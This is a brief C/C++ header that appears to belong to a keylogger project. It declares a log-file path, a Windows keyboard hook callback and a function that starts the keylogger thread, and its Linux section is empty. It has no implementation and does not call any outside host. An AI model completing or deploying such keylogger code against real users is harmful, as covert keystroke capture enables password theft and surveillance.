#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#include <fstream>
#else 
#include <unistd.h>
#endif


#ifdef __cplusplus
extern "C" {
#endif

// windows 
extern const char keyloggerfile[256];
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);


DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
// linux

#ifdef __cplusplus
}
#endif

#endif


